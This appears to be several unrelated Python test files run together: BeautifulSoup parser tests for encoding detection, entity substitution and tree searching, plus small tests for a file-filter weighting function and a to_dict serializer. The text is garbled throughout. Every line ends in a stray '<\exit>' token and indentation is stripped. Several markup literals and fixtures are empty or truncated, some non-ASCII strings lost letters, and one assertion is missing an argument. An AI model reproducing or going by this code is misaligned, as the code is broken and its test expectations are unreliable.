with warnings.catch_warnings(record=False) as w:<\exit>
soup = BeautifulStoneSoup("<b />")<\exit>
self.assertEqual(u"<b/>", unicode(soup.b))<\exit>
def test_real_xhtml_document(self):<\exit>
markup = b<\exit>
soup = self.soup(markup)<\exit>
self.assertEqual(<\exit>
soup.encode("utf-8").replace(b"\n", b''),<\exit>
markup.replace(b'\n', b'').replace(<\exit>
b'<?xml version="1.0" encoding="utf-8"?>', b''))<\exit>
@skipIf(<\exit>
not LXML_PRESENT,<\exit>
"lxml seems not to be present, not testing its XML tree builder.")<\exit>
class LXMLXMLTreeBuilderSmokeTest(SoupTest, XMLTreeBuilderSmokeTest):<\exit>
@property<\exit>
def default_builder(self):<\exit>
return LXMLTreeBuilderForXML()<\exit>
import sys<\exit>
import os<\exit>
sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)),'..'))<\exit>
from qfc.core import filter_files, get_weight<\exit>
def _equals(marks_list1, marks_list2):<\exit>
l1 = sorted(marks_list1)<\exit>
l2 = sorted(marks_list2)<\exit>
if len(l1) != len(l2):<\exit>
return False<\exit>
for i,_ in enumerate(l1):<\exit>
if l1[i] != l2[i]:<\exit>
return False<\exit>
return True<\exit>
def test_filter_files():<\exit>
files = [<\exit>
'/',<\exit>
'/a/',<\exit>
'/b/',<\exit>
'/a/b',<\exit>
'/a/b/c',<\exit>
'/b/a/',<\exit>
'/b/a/c',<\exit>
'd',<\exit>
'da'<\exit>
]<\exit>
assert(_equals(filter_files(files,''), ['/','d','da']))<\exit>
assert(_equals(filter_files(files,'/'), ['/']))<\exit>
assert(_equals(filter_files(files,'a'), ['/a/', '/b/a/', 'da']))<\exit>
def test_weight():<\exit>
assert(get_weight('a','') == 1001)<\exit>
assert(get_weight('a/','') == 1000)<\exit>
assert(get_weight('a/b/','') == 2000)<\exit>
assert(get_weight('a/b/c','') == 3001)<\exit>
assert(get_weight('a','a')  == 1001)<\exit>
assert(get_weight('ab','a')  == 1021)<\exit>
assert(get_weight('bab','a')  == 1111)<\exit>
assert(get_weight('a_b','a')  == 1011)<\exit>
assert(get_weight('root/a_b','a')  == 2011)<\exit>
assert(get_weight('root/a_b_c_d_e_f_g_h_i_j_k','k')  == 2091)<\exit>
assert(get_weight('a/b/c/d/e/f/g/h/i/j/k','k')  == 10001)<\exit>
assert(get_weight('a/B/','b') == 2000)<\exit>
from unittest import TestCase<\exit>
from util.commons_util.fundamentals.serialization import *<\exit>
class TestSerialization(TestCase):<\exit>
def test_todict(self):<\exit>
class BinaryTree(ToDictMixin):<\exit>
def __init__(self, value, left=None, right=None):<\exit>
self.value = value<\exit>
self.left = left<\exit>
self.right = right<\exit>
tree = BinaryTree(10,<\exit>
left=BinaryTree(7, right=BinaryTree(9)),<\exit>
right=BinaryTree(13, left=BinaryTree(11)))<\exit>
self.assertEquals(tree.to_dict(), {'right': {'right': None, 'value': 13, 'left': {'right': None, 'value': 11, 'left': None}}, 'value': 10, 'left': {'right': {'right': None, 'value': 9, 'left': None}, 'value': 7, 'left': None}})<\exit>
import logging<\exit>
import unittest<\exit>
import sys<\exit>
from bs4 import (<\exit>
BeautifulSoup,<\exit>
BeautifulStoneSoup,<\exit>
)<\exit>
from bs4.element import (<\exit>
CharsetMetaAttributeValue,<\exit>
ContentMetaAttributeValue,<\exit>
SoupStrainer,<\exit>
NamespacedAttribute,<\exit>
)<\exit>
import bs4.dammit<\exit>
from bs4.dammit import EntitySubstitution, UnicodeDammit<\exit>
from bs4.testing import (<\exit>
SoupTest,<\exit>
skipIf,<\exit>
)<\exit>
import warnings<\exit>
try:<\exit>
from bs4.builder import LXMLTreeBuilder, LXMLTreeBuilderForXML<\exit>
LXML_PRESENT = True<\exit>
except ImportError, e:<\exit>
LXML_PRESENT = False<\exit>
PYTHON_2_PRE_2_7 = (sys.version_info < (2,7))<\exit>
PYTHON_3_PRE_3_2 = (sys.version_info[0] == 3 and sys.version_info < (3,2))<\exit>
class TestDeprecatedConstructorArguments(SoupTest):<\exit>
def test_parseOnlyThese_renamed_to_parse_only(self):<\exit>
with warnings.catch_warnings(record=True) as w:<\exit>
soup = self.soup("<a><b></b></a>", parseOnlyThese=SoupStrainer("b"))<\exit>
msg = str(w[0].message)<\exit>
self.assertTrue("parseOnlyThese" in msg)<\exit>
self.assertTrue("parse_only" in msg)<\exit>
self.assertEqual(b"<b></b>", soup.encode())<\exit>
def test_fromEncoding_renamed_to_from_encoding(self):<\exit>
with warnings.catch_warnings(record=True) as w:<\exit>
utf8 = b"\xc3\xa9"<\exit>
soup = self.soup(utf8, fromEncoding="utf8")<\exit>
msg = str(w[0].message)<\exit>
self.assertTrue("fromEncoding" in msg)<\exit>
self.assertTrue("from_encoding" in msg)<\exit>
self.assertEqual("utf8", soup.original_encoding)<\exit>
def test_unrecognized_keyword_argument(self):<\exit>
self.assertRaises(<\exit>
TypeError, self.soup, "<a>", no_such_argument=True)<\exit>
@skipIf(<\exit>
not LXML_PRESENT,<\exit>
"lxml not present, not testing BeautifulStoneSoup.")<\exit>
def test_beautifulstonesoup(self):<\exit>
with warnings.catch_warnings(record=True) as w:<\exit>
soup = BeautifulStoneSoup("<markup>")<\exit>
self.assertTrue(isinstance(soup, BeautifulSoup))<\exit>
self.assertTrue("BeautifulStoneSoup class is deprecated")<\exit>
class TestSelectiveParsing(SoupTest):<\exit>
def test_parse_with_soupstrainer(self):<\exit>
markup = "No<b>Yes</b><a>No<b>Yes <c>Yes</c></b>"<\exit>
strainer = SoupStrainer("b")<\exit>
soup = self.soup(markup, parse_only=strainer)<\exit>
self.assertEqual(soup.encode(), b"<b>Yes</b><b>Yes <c>Yes</c></b>")<\exit>
class TestEntitySubstitution(unittest.TestCase):<\exit>
def setUp(self):<\exit>
self.sub = EntitySubstitution<\exit>
def test_simple_html_substitution(self):<\exit>
s = u"foo\u2200\N{SNOWMAN}\u00f5bar"<\exit>
self.assertEqual(self.sub.substitute_html(s),<\exit>
u"foo&forall;\N{SNOWMAN}&otilde;bar")<\exit>
def test_smart_quote_substitution(self):<\exit>
quotes = b"\x91\x92foo\x93\x94"<\exit>
dammit = UnicodeDammit(quotes)<\exit>
self.assertEqual(self.sub.substitute_html(dammit.markup),<\exit>
"&lsquo;&rsquo;foo&ldquo;&rdquo;")<\exit>
def test_xml_converstion_includes_no_quotes_if_make_quoted_attribute_is_false(self):<\exit>
s = 'Welcome to "my bar"'<\exit>
self.assertEqual(self.sub.substitute_xml(s, False), s)<\exit>
def test_xml_attribute_quoting_normally_uses_double_quotes(self):<\exit>
self.assertEqual(self.sub.substitute_xml("Welcome", True),<\exit>
'"Welcome"')<\exit>
self.assertEqual(self.sub.substitute_xml("Bob's Bar", True),<\exit>
'"Bob\'s Bar"')<\exit>
def test_xml_attribute_quoting_uses_single_quotes_when_value_contains_double_quotes(self):<\exit>
s = 'Welcome to "my bar"'<\exit>
self.assertEqual(self.sub.substitute_xml(s, True),<\exit>
"'Welcome to \"my bar\"'")<\exit>
def test_xml_attribute_quoting_escapes_single_quotes_when_value_contains_both_single_and_double_quotes(self):<\exit>
s = 'Welcome to "Bob\'s Bar"'<\exit>
self.assertEqual(<\exit>
self.sub.substitute_xml(s, True),<\exit>
'"Welcome to &quot;Bob\'s Bar&quot;"')<\exit>
def test_xml_quotes_arent_escaped_when_value_is_not_being_quoted(self):<\exit>
quoted = 'Welcome to "Bob\'s Bar"'<\exit>
self.assertEqual(self.sub.substitute_xml(quoted), quoted)<\exit>
def test_xml_quoting_handles_angle_brackets(self):<\exit>
self.assertEqual(<\exit>
self.sub.substitute_xml("foo<bar>"),<\exit>
"foo&lt;bar&gt;")<\exit>
def test_xml_quoting_handles_ampersands(self):<\exit>
self.assertEqual(self.sub.substitute_xml("AT&T"), "AT&amp;T")<\exit>
def test_xml_quoting_ignores_ampersands_when_they_are_part_of_an_entity(self):<\exit>
self.assertEqual(<\exit>
self.sub.substitute_xml("&Aacute;T&T"),<\exit>
"&Aacute;T&amp;T")<\exit>
def test_quotes_not_html_substituted(self):<\exit>
text = 'Bob\'s "bar"'<\exit>
self.assertEqual(self.sub.substitute_html(text), text)<\exit>
class TestEncodingConversion(SoupTest):<\exit>
def setUp(self):<\exit>
super(TestEncodingConversion, self).setUp()<\exit>
self.unicode_data = u'<html><head><meta charset="utf-8"/></head><body><foo>Sacr\N{LATIN SMALL LETTER E WITH ACUTE} bleu!</foo></body></html>'<\exit>
self.utf8_data = self.unicode_data.encode("utf-8")<\exit>
self.assertEqual(<\exit>
self.utf8_data,<\exit>
b'<html><head><meta charset="utf-8"/></head><body><foo>Sacr\xc3\xa9 bleu!</foo></body></html>')<\exit>
def test_ascii_in_unicode_out(self):<\exit>
ascii = b"<foo>a</foo>"<\exit>
soup_from_ascii = self.soup(ascii)<\exit>
unicode_output = soup_from_ascii.decode()<\exit>
self.assertTrue(isinstance(unicode_output, unicode))<\exit>
self.assertEqual(unicode_output, self.document_for(ascii.decode()))<\exit>
self.assertEqual(soup_from_ascii.original_encoding.lower(), "ascii")<\exit>
def test_unicode_in_unicode_out(self):<\exit>
soup_from_unicode = self.soup(self.unicode_data)<\exit>
self.assertEqual(soup_from_unicode.decode(), self.unicode_data)<\exit>
self.assertEqual(soup_from_unicode.foo.string, u'Sacr\xe9 bleu!')<\exit>
self.assertEqual(soup_from_unicode.original_encoding, None)<\exit>
def test_utf8_in_unicode_out(self):<\exit>
soup_from_utf8 = self.soup(self.utf8_data)<\exit>
self.assertEqual(soup_from_utf8.decode(), self.unicode_data)<\exit>
self.assertEqual(soup_from_utf8.foo.string, u'Sacr\xe9 bleu!')<\exit>
def test_utf8_out(self):<\exit>
soup_from_unicode = self.soup(self.unicode_data)<\exit>
self.assertEqual(soup_from_unicode.encode('utf-8'), self.utf8_data)<\exit>
@skipIf(<\exit>
PYTHON_2_PRE_2_7 or PYTHON_3_PRE_3_2,<\exit>
"Bad HTMLParser detected; skipping test of non-ASCII characters in attribute name.")<\exit>
def test_attribute_name_containing_unicode_characters(self):<\exit>
markup = u'<div><a \N{SNOWMAN}="snowman"></a></div>'<\exit>
self.assertEqual(self.soup(markup).div.encode("utf8"), markup.encode("utf8"))<\exit>
class TestUnicodeDammit(unittest.TestCase):<\exit>
def test_smart_quotes_to_unicode(self):<\exit>
markup = b"<foo>\x91\x92\x93\x94</foo>"<\exit>
dammit = UnicodeDammit(markup)<\exit>
self.assertEqual(<\exit>
dammit.unicode_markup, u"<foo>\u2018\u2019\u201c\u201d</foo>")<\exit>
def test_smart_quotes_to_xml_entities(self):<\exit>
markup = b"<foo>\x91\x92\x93\x94</foo>"<\exit>
dammit = UnicodeDammit(markup, smart_quotes_to="xml")<\exit>
self.assertEqual(<\exit>
dammit.unicode_markup, "<foo>&<\exit>
def test_smart_quotes_to_html_entities(self):<\exit>
markup = b"<foo>\x91\x92\x93\x94</foo>"<\exit>
dammit = UnicodeDammit(markup, smart_quotes_to="html")<\exit>
self.assertEqual(<\exit>
dammit.unicode_markup, "<foo>&lsquo;&rsquo;&ldquo;&rdquo;</foo>")<\exit>
def test_smart_quotes_to_ascii(self):<\exit>
markup = b"<foo>\x91\x92\x93\x94</foo>"<\exit>
dammit = UnicodeDammit(markup, smart_quotes_to="ascii")<\exit>
self.assertEqual(<\exit>
dammit.unicode_markup, )<\exit>
def test_detect_utf8(self):<\exit>
utf8 = b"\xc3\xa9"<\exit>
dammit = UnicodeDammit(utf8)<\exit>
self.assertEqual(dammit.unicode_markup, u'\xe9')<\exit>
self.assertEqual(dammit.original_encoding.lower(), 'utf-8')<\exit>
def test_convert_hebrew(self):<\exit>
hebrew = b"\xed\xe5\xec\xf9"<\exit>
dammit = UnicodeDammit(hebrew, ["iso-8859-8"])<\exit>
self.assertEqual(dammit.original_encoding.lower(), 'iso-8859-8')<\exit>
self.assertEqual(dammit.unicode_markup, u'\u05dd\u05d5\u05dc\u05e9')<\exit>
def test_dont_see_smart_quotes_where_there_are_none(self):<\exit>
utf_8 = b"\343\202\261\343\203\274\343\202\277\343\202\244 Watch"<\exit>
dammit = UnicodeDammit(utf_8)<\exit>
self.assertEqual(dammit.original_encoding.lower(), 'utf-8')<\exit>
self.assertEqual(dammit.unicode_markup.encode("utf-8"), utf_8)<\exit>
def test_ignore_inappropriate_codecs(self):<\exit>
utf8_data = u"Rksmrgs".encode("utf-8")<\exit>
dammit = UnicodeDammit(utf8_data, ["iso-8859-8"])<\exit>
self.assertEqual(dammit.original_encoding.lower(), 'utf-8')<\exit>
def test_ignore_invalid_codecs(self):<\exit>
utf8_data = u"Rksmrgs".encode("utf-8")<\exit>
for bad_encoding in ['.utf8', '...', 'utF---16.!']:<\exit>
dammit = UnicodeDammit(utf8_data, [bad_encoding])<\exit>
self.assertEqual(dammit.original_encoding.lower(), 'utf-8')<\exit>
def test_detect_html5_style_meta_tag(self):<\exit>
for data in (<\exit>
b'<html><meta charset="euc-jp" /></html>',<\exit>
b"<html><meta charset='euc-jp' /></html>",<\exit>
b"<html><meta charset=euc-jp /></html>",<\exit>
b"<html><meta charset=euc-jp/></html>"):<\exit>
dammit = UnicodeDammit(data, is_html=True)<\exit>
self.assertEqual(<\exit>
"euc-jp", dammit.original_encoding)<\exit>
def test_last_ditch_entity_replacement(self):<\exit>
doc = b<\exit>
chardet = bs4.dammit.chardet_dammit<\exit>
logging.disable(logging.WARNING)<\exit>
try:<\exit>
def noop(str):<\exit>
return None<\exit>
bs4.dammit.chardet_dammit = noop<\exit>
dammit = UnicodeDammit(doc)<\exit>
self.assertEqual(True, dammit.contains_replacement_characters)<\exit>
self.assertTrue(u"\ufffd" in dammit.unicode_markup)<\exit>
soup = BeautifulSoup(doc, "html.parser")<\exit>
self.assertTrue(soup.contains_replacement_characters)<\exit>
finally:<\exit>
logging.disable(logging.NOTSET)<\exit>
bs4.dammit.chardet_dammit = chardet<\exit>
def test_sniffed_xml_encoding(self):<\exit>
data = b'\xff\xfe<\x00a\x00>\x00\xe1\x00\xe9\x00<\x00/\x00a\x00>\x00'<\exit>
dammit = UnicodeDammit(data)<\exit>
self.assertEqual(u"<a></a>", dammit.unicode_markup)<\exit>
self.assertEqual("utf-16le", dammit.original_encoding)<\exit>
def test_detwingle(self):<\exit>
utf8 = (u"\N{SNOWMAN}" * 3).encode("utf8")<\exit>
windows_1252 = (<\exit>
u"\N{LEFT DOUBLE QUOTATION MARK}Hi, I like Windows!"<\exit>
u"\N{RIGHT DOUBLE QUOTATION MARK}").encode("windows_1252")<\exit>
doc = utf8 + windows_1252 + utf8<\exit>
self.assertRaises(UnicodeDecodeError, doc.decode, "utf8")<\exit>
fixed = UnicodeDammit.detwingle(doc)<\exit>
self.assertEqual(<\exit>
u"i, I like Windows!", fixed.decode("utf8"))<\exit>
def test_detwingle_ignores_multibyte_characters(self):<\exit>
for tricky_unicode_char in (<\exit>
u"\N{LATIN SMALL LIGATURE OE}",<\exit>
u"\N{LATIN SUBSCRIPT SMALL LETTER X}",<\exit>
u"\xf0\x90\x90\x93",<\exit>
):<\exit>
input = tricky_unicode_char.encode("utf8")<\exit>
self.assertTrue(input.endswith(b'\x93'))<\exit>
output = UnicodeDammit.detwingle(input)<\exit>
self.assertEqual(output, input)<\exit>
class TestNamedspacedAttribute(SoupTest):<\exit>
def test_name_may_be_none(self):<\exit>
a = NamespacedAttribute("xmlns", None)<\exit>
self.assertEqual(a, "xmlns")<\exit>
def test_attribute_is_equivalent_to_colon_separated_string(self):<\exit>
a = NamespacedAttribute("a", "b")<\exit>
self.assertEqual("a:b", a)<\exit>
def test_attributes_are_equivalent_if_prefix_and_name_identical(self):<\exit>
a = NamespacedAttribute("a", "b", "c")<\exit>
b = NamespacedAttribute("a", "b", "c")<\exit>
self.assertEqual(a, b)<\exit>
c = NamespacedAttribute("a", "b", None)<\exit>
self.assertEqual(a, c)<\exit>
d = NamespacedAttribute("a", "z", "c")<\exit>
self.assertNotEqual(a, d)<\exit>
e = NamespacedAttribute("z", "b", "c")<\exit>
self.assertNotEqual(a, e)<\exit>
class TestAttributeValueWithCharsetSubstitution(unittest.TestCase):<\exit>
def test_content_meta_attribute_value(self):<\exit>
value = CharsetMetaAttributeValue("euc-jp")<\exit>
self.assertEqual("euc-jp", value)<\exit>
self.assertEqual("euc-jp", value.original_value)<\exit>
self.assertEqual("utf8", value.encode("utf8"))<\exit>
def test_content_meta_attribute_value(self):<\exit>
value = ContentMetaAttributeValue("text/html; charset=euc-jp")<\exit>
self.assertEqual("text/html; charset=euc-jp", value)<\exit>
self.assertEqual("text/html; charset=euc-jp", value.original_value)<\exit>
self.assertEqual("text/html; charset=utf8", value.encode("utf8"))<\exit>
import copy<\exit>
import pickle<\exit>
import re<\exit>
import warnings<\exit>
from bs4 import BeautifulSoup<\exit>
from bs4.builder import (<\exit>
builder_registry,<\exit>
HTMLParserTreeBuilder,<\exit>
)<\exit>
from bs4.element import (<\exit>
CData,<\exit>
Doctype,<\exit>
NavigableString,<\exit>
SoupStrainer,<\exit>
Tag,<\exit>
)<\exit>
from bs4.testing import (<\exit>
SoupTest,<\exit>
skipIf,<\exit>
)<\exit>
XML_BUILDER_PRESENT = (builder_registry.lookup("xml") is not None)<\exit>
LXML_PRESENT = (builder_registry.lookup("lxml") is not None)<\exit>
class TreeTest(SoupTest):<\exit>
def assertSelects(self, tags, should_match):<\exit>
self.assertEqual([tag.string for tag in tags], should_match)<\exit>
def assertSelectsIDs(self, tags, should_match):<\exit>
self.assertEqual([tag['id'] for tag in tags], should_match)<\exit>
class TestFind(TreeTest):<\exit>
def test_find_tag(self):<\exit>
soup = self.soup("<a>1</a><b>2</b><a>3</a><b>4</b>")<\exit>
self.assertEqual(soup.find("b").string, "2")<\exit>
def test_unicode_text_find(self):<\exit>
soup = self.soup(u'<h1>Rksmrgs</h1>')<\exit>
self.assertEqual(soup.find(text=u'Rksmrgs'), u'Rksmrgs')<\exit>
class TestFindAll(TreeTest):<\exit>
def test_find_all_text_nodes(self):<\exit>
soup = self.soup("<html>Foo<b>bar</b>\xbb</html>")<\exit>
self.assertEqual(soup.find_all(text="bar"), [u"bar"])<\exit>
self.assertEqual(<\exit>
soup.find_all(text=["Foo", "bar"]), [u"Foo", u"bar"])<\exit>
self.assertEqual(soup.find_all(text=re.compile('.*')),<\exit>
[u"Foo", u"bar", u'\xbb'])<\exit>
self.assertEqual(soup.find_all(text=True),<\exit>
[u"Foo", u"bar", u'\xbb'])<\exit>
def test_find_all_limit(self):<\exit>
soup = self.soup("<a>1</a><a>2</a><a>3</a><a>4</a><a>5</a>")<\exit>
self.assertSelects(soup.find_all('a', limit=3), ["1", "2", "3"])<\exit>
self.assertSelects(soup.find_all('a', limit=1), ["1"])<\exit>
self.assertSelects(<\exit>
soup.find_all('a', limit=10), ["1", "2", "3", "4", "5"])<\exit>
self.assertSelects(<\exit>
soup.find_all('a', limit=0), ["1", "2", "3", "4", "5"])<\exit>
def test_calling_a_tag_is_calling_findall(self):<\exit>
soup = self.soup("<a>1</a><b>2<a id='foo'>3</a></b>")<\exit>
self.assertSelects(soup('a', limit=1), ["1"])<\exit>
self.assertSelects(soup.b(id="foo"), ["3"])<\exit>
def test_find_all_with_self_referential_data_structure_does_not_cause_infinite_recursion(self):<\exit>
soup = self.soup("<a></a>")<\exit>
l = []<\exit>
l.append(l)<\exit>
self.assertEqual([], soup.find_all(l))<\exit>
class TestFindAllBasicNamespaces(TreeTest):<\exit>
def test_find_by_namespaced_name(self):<\exit>
soup = self.soup('<mathml:msqrt>4</mathml:msqrt><a svg:fill="red">')<\exit>
self.assertEqual("4", soup.find("mathml:msqrt").string)<\exit>
self.assertEqual("a", soup.find(attrs= { "svg:fill" : "red" }).name)<\exit>
class TestFindAllByName(TreeTest):<\exit>
def setUp(self):<\exit>
super(TreeTest, self).setUp()<\exit>
self.tree =  self.soup()<\exit>
def test_find_all_by_tag_name(self):<\exit>
self.assertSelects(<\exit>
self.tree.find_all('a'), ['First tag.', 'Nested tag.'])<\exit>
def test_find_all_by_name_and_text(self):<\exit>
self.assertSelects(<\exit>
self.tree.find_all('a', text='First tag.'), ['First tag.'])<\exit>
self.assertSelects(<\exit>
self.tree.find_all('a', text=True), ['First tag.', 'Nested tag.'])<\exit>
self.assertSelects(<\exit>
self.tree.find_all('a', text=re.compile("tag")),<\exit>
['First tag.', 'Nested tag.'])<\exit>
def test_find_all_on_non_root_element(self):<\exit>
self.assertSelects(self.tree.c.find_all('a'), ['Nested tag.'])<\exit>
def test_calling_element_invokes_find_all(self):<\exit>
self.assertSelects(self.tree('a'), ['First tag.', 'Nested tag.'])<\exit>
def test_find_all_by_tag_strainer(self):<\exit>
self.assertSelects(<\exit>
self.tree.find_all(SoupStrainer('a')),<\exit>
['First tag.', 'Nested tag.'])<\exit>
def test_find_all_by_tag_names(self):<\exit>
self.assertSelects(<\exit>
self.tree.find_all(['a', 'b']),<\exit>
['First tag.', 'Second tag.', 'Nested tag.'])<\exit>
def test_find_all_by_tag_dict(self):<\exit>
self.assertSelects(<\exit>
self.tree.find_all({'a' : True, 'b' : True}),<\exit>
['First tag.', 'Second tag.', 'Nested tag.'])<\exit>
def test_find_all_by_tag_re(self):<\exit>
self.assertSelects(<\exit>
self.tree.find_all(re.compile('^[ab]$')),<\exit>
['First tag.', 'Second tag.', 'Nested tag.'])<\exit>
def test_find_all_with_tags_matching_method(self):<\exit>
def id_matches_name(tag):<\exit>
return tag.name == tag.get('id')<\exit>
tree = self.soup()<\exit>
self.assertSelects(<\exit>
tree.find_all(id_matches_name), ["Match 1.", "Match 2."])<\exit>
class TestFindAllByAttribute(TreeTest):<\exit>
def test_find_all_by_attribute_name(self):<\exit>
tree = self.soup()<\exit>
self.assertSelects(tree.find_all(id='first'),<\exit>
["Matching a.", "Matching b."])<\exit>
def test_find_all_by_utf8_attribute_value(self):<\exit>
peace = u"".encode("utf8")<\exit>
data = u'<a title=""></a>'.encode("utf8")<\exit>
soup = self.soup(data)<\exit>
self.assertEqual([soup.a], soup.find_all(title=peace))<\exit>
self.assertEqual([soup.a], soup.find_all(title=peace.decode("utf8")))<\exit>
self.assertEqual([soup.a], soup.find_all(title=[peace, "something else"]))<\exit>
def test_find_all_by_attribute_dict(self):<\exit>
tree = self.soup()<\exit>
self.assertSelects(tree.find_all(name='name1'),<\exit>
["A tag called 'name1'."])<\exit>
self.assertSelects(tree.find_all(attrs={'name' : 'name1'}),<\exit>
["Name match."])<\exit>
self.assertSelects(tree.find_all(attrs={'class' : 'class2'}),<\exit>
["Class match."])<\exit>
def test_find_all_by_class(self):<\exit>
tree = self.soup()<\exit>
self.assertSelects(tree.find_all('a', class_='1'), ['Class 1.'])<\exit>
self.assertSelects(tree.find_all('c', class_='3'), ['Class 3 and 4.'])<\exit>
self.assertSelects(tree.find_all('c', class_='4'), ['Class 3 and 4.'])<\exit>
self.assertSelects(tree.find_all('a', '1'), ['Class 1.'])<\exit>
self.assertSelects(tree.find_all(attrs='1'), ['Class 1.', 'Class 1.'])<\exit>
self.assertSelects(tree.find_all('c', '3'), ['Class 3 and 4.'])<\exit>
self.assertSelects(tree.find_all('c', '4'), ['Class 3 and 4.'])<\exit>
def test_find_by_class_when_multiple_classes_present(self):<\exit>
tree = self.soup("<gar class='foo bar'>Found it</gar>")<\exit>
f = tree.find_all("gar", class_=re.compile("o"))<\exit>
self.assertSelects(f, ["Found it"])<\exit>
f = tree.find_all("gar", class_=re.compile("a"))<\exit>
self.assertSelects(f, ["Found it"])<\exit>
f = tree.find_all("gar", class_=re.compile("o b"))<\exit>
self.assertSelects(f, [])<\exit>
def test_find_all_with_non_dictionary_for_attrs_finds_by_class(self):<\exit>
soup = self.soup("<a class='bar'>Found it</a>")<\exit>
self.assertSelects(soup.find_all("a", re.compile("ba")), ["Found it"])<\exit>
def big_attribute_value(value):<\exit>
return len(value) > 3<\exit>
self.assertSelects(soup.find_all("a", big_attribute_value), [])<\exit>
def small_attribute_value(value):<\exit>
return len(value) <= 3<\exit>
self.assertSelects(<\exit>
soup.find_all("a", small_attribute_value), ["Found it"])<\exit>
def test_find_all_with_string_for_attrs_finds_multiple_classes(self):<\exit>
soup = self.soup('<a class="foo bar"></a><a class="foo"></a>')<\exit>
a, a2 = soup.find_all("a")<\exit>
self.assertEqual([a, a2], soup.find_all("a", "foo"))<\exit>
self.assertEqual([a], soup.find_all("a", "bar"))<\exit>
self.assertEqual([a], soup.find_all("a", class_="foo bar"))<\exit>
self.assertEqual([a], soup.find_all("a", "foo bar"))<\exit>
self.assertEqual([], soup.find_all("a", "bar foo"))<\exit>
def test_find_all_by_attribute_soupstrainer(self):<\exit>
tree = self.soup()<\exit>
strainer = SoupStrainer(attrs={'id' : 'first'})<\exit>
self.assertSelects(tree.find_all(strainer), ['Match.'])<\exit>
def test_find_all_with_missing_atribute(self):<\exit>
tree = self.soup()<\exit>
self.assertSelects(tree.find_all('a', id=None), ["No ID present."])<\exit>
def test_find_all_with_defined_attribute(self):<\exit>
tree = self.soup()<\exit>
self.assertSelects(<\exit>
tree.find_all(id=True), ["ID present.", "ID is empty."])<\exit>
def test_find_all_with_numeric_attribute(self):<\exit>
tree = self.soup()<\exit>
expected = ["Unquoted attribute.", "Quoted attribute."]<\exit>
self.assertSelects(tree.find_all(id=1), expected)<\exit>
self.assertSelects(tree.find_all(id="1"), expected)<\exit>
def test_find_all_with_list_attribute_values(self):<\exit>
tree = self.soup()<\exit>
self.assertSelects(tree.find_all(id=["1", "3", "4"]),<\exit>
["1", "3"])<\exit>
def test_find_all_with_regular_expression_attribute_value(self):<\exit>
tree = self.soup()<\exit>
self.assertSelects(tree.find_all(id=re.compile("^a+$")),<\exit>
["One a.", "Two as."])<\exit>
def test_find_by_name_and_containing_string(self):<\exit>
soup = self.soup("<b>foo</b><b>bar</b><a>foo</a>")<\exit>
a = soup.a<\exit>
self.assertEqual([a], soup.find_all("a", text="foo"))<\exit>
self.assertEqual([], soup.find_all("a", text="bar"))<\exit>
self.assertEqual([], soup.find_all("a", text="bar"))<\exit>
def test_find_by_name_and_containing_string_when_string_is_buried(self):<\exit>
soup = self.soup("<a>foo</a><a><b><c>foo</c></b></a>")<\exit>
self.assertEqual(soup.find_all("a"), soup.find_all("a", text="foo"))<\exit>
def test_find_by_attribute_and_containing_string(self):<\exit>
soup = self.soup('<b id="1">foo</b><a id="2">foo</a>')<\exit>
a = soup.a<\exit>
self.assertEqual([a], soup.find_all(id=2, text="foo"))<\exit>
self.assertEqual([], soup.find_all(id=1, text="bar"))<\exit>
class TestIndex(TreeTest):<\exit>
def test_index(self):<\exit>
tree = self.soup()<\exit>
div = tree.div<\exit>
for i, element in enumerate(div.contents):<\exit>
self.assertEqual(i, div.index(element))<\exit>
self.assertRaises(ValueError, tree.index, 1)<\exit>
class TestParentOperations(TreeTest):<\exit>
def setUp(self):<\exit>
super(TestParentOperations, self).setUp()<\exit>
self.tree = self.soup()<\exit>
self.start = self.tree.b<\exit>
def test_parent(self):<\exit>
self.assertEqual(self.start.parent['id'], 'bottom')<\exit>
self.assertEqual(self.start.parent.parent['id'], 'middle')<\exit>
self.assertEqual(self.start.parent.parent.parent['id'], 'top')<\exit>
def test_parent_of_top_tag_is_soup_object(self):<\exit>
top_tag = self.tree.contents[0]<\exit>
self.assertEqual(top_tag.parent, self.tree)<\exit>
def test_soup_object_has_no_parent(self):<\exit>
self.assertEqual(None, self.tree.parent)<\exit>
def test_find_parents(self):<\exit>
self.assertSelectsIDs(<\exit>
self.start.find_parents('ul'), ['bottom', 'middle', 'top'])<\exit>
self.assertSelectsIDs(<\exit>
self.start.find_parents('ul', id="middle"), ['middle'])<\exit>
def test_find_parent(self):<\exit>
self.assertEqual(self.start.find_parent('ul')['id'], 'bottom')<\exit>
def test_parent_of_text_element(self):<\exit>
text = self.tree.find(text="Start here")<\exit>
self.assertEqual(text.parent.name, 'b')<\exit>
def test_text_element_find_parent(self):<\exit>
text = self.tree.find(text="Start here")<\exit>
self.assertEqual(text.find_parent('ul')['id'], 'bottom')<\exit>
def test_parent_generator(self):<\exit>
parents = [parent['id'] for parent in self.start.parents<\exit>
if parent is not None and 'id' in parent.attrs]<\exit>
self.assertEqual(parents, ['bottom', 'middle', 'top'])<\exit>
class ProximityTest(TreeTest):<\exit>
def setUp(self):<\exit>
super(TreeTest, self).setUp()<\exit>
self.tree = self.soup(<\exit>
'<html id="start"><head></head><body><b id="1">One</b><b id="2">Two</b><b id="3">Three</b></body></html>')<\exit>
class TestNextOperations(ProximityTest):<\exit>
def setUp(self):<\exit>
super(TestNextOperations, self).setUp()<\exit>
self.start = self.tree.b<\exit>
def test_next(self):<\exit>
self.assertEqual(self.start.next_element, "One")<\exit>
self.assertEqual(self.start.next_element.next_element['id'], "2")<\exit>
def test_next_of_last_item_is_none(self):<\exit>
last = self.tree.find(text="Three")<\exit>
self.assertEqual(last.next_element, None)<\exit>
def test_next_of_root_is_none(self):<\exit>
self.assertEqual(self.tree.next_element, None)<\exit>
def test_find_all_next(self):<\exit>
self.assertSelects(self.start.find_all_next('b'), ["Two", "Three"])<\exit>
self.start.find_all_next(id=3)<\exit>
self.assertSelects(self.start.find_all_next(id=3), ["Three"])<\exit>
def test_find_next(self):<\exit>
self.assertEqual(self.start.find_next('b')['id'], '2')<\exit>
self.assertEqual(self.start.find_next(text="Three"), "Three")<\exit>
def test_find_next_for_text_element(self):<\exit>
text = self.tree.find(text="One")<\exit>
self.assertEqual(text.find_next("b").string, "Two")<\exit>
self.assertSelects(text.find_all_next("b"), ["Two", "Three"])<\exit>
def test_next_generator(self):<\exit>
start = self.tree.find(text="Two")<\exit>
successors = [node for node in start.next_elements]<\exit>
tag, contents = successors<\exit>
self.assertEqual(tag['id'], '3')<\exit>
self.assertEqual(contents, "Three")<\exit>
